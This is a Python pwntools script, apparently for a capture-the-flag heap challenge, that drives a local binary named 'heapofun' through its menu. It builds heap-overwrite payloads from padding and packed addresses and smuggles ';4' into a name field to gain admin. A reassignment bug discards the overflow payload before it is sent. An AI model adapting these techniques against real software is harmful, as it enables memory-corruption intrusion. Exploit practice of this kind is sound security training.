#!/usr/bin/python

from pwn import *
import os
import subprocess
import sys
import re

row = ord('A')
col = ord('0')
seat = chr(row)+chr(col)


f = open('payload', 'w')

conn = process('./heapofun')

def do(inst):
	conn.sendline(inst)
	f.write(inst + '\n')


def getAdmin():
	do('2')
	conn.recvuntil('>')
	do('Admin')
	conn.recvuntil('>')
	do(';4')

def addUser(name='J'*16):
	do('2')
	conn.recvuntil('>')
	do(name)
	conn.recvuntil('>')
	do(seat)

def hackedUser():
	do('8')
	conn.recvuntil('>')
	do("HackerAAAAAAAAAA")
	conn.recvuntil('>')
	do(seat) # same seat as the one we used for HackerAAA..

	newName = "K"*4*6 # padding
	newName += p32(0x0804c0c0) 
	newName += p32(0x0804c0c0) 
	newName += p32(0x00000025) 
	newName = "J"*4
	do(newName)


def inc_seat(my_row, my_col):
	my_col += 1
	if my_col >= ord('6'):
		my_col = ord('0')
		my_row += 1
	my_seat = chr(my_row)+chr(my_col)
	return (my_seat, my_row, my_col)


while 1:
	menu = conn.recvuntil('>')
	menu = menu[:-1]
	menu += ' A. Get admin\n' 
	menu += ' B. Add user\n' 
	menu += ' C. Add hacked user\n' 
	print menu,

	option = raw_input('>')
	# print len(option)
	# print option
	# if len(option) <= 0:
	# 	do('1')
	# 	continue

	if option == 'A':
		getAdmin()
	elif option[0] == 'B':
		addUser()
		seat, row, col = inc_seat(row, col)
	elif option == 'C':
		addUser('HackerAAAAAAAAAA')
		seat, row, col = inc_seat(row, col)
		conn.recvuntil('>') # this is the menu which we'll ignore
		hackedUser()
	else:

		do(option)
		line = conn.recvuntil('>')
		while not re.search('Choose an option:', line):
			print line + 'lol',
			option = raw_input()
			do(option)
			line = conn.recvuntil('>')
		index = line.find('Choose')
		print line[:index]
		#now it's the menu
		#don't print it jsut do nothing
		do('1') #prints a pun
		conn.recvuntil('\n') #drop the pun







